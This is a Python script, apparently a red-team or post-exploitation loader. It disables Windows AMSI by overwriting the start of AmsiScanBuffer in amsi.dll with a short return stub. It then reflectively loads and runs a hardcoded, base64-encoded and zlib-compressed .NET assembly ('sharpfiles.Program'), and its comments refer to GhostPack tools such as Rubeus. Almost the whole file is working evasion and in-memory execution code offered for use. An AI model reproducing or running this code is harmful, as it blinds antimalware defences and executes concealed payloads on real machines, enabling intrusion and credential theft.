import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("sharpfiles.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()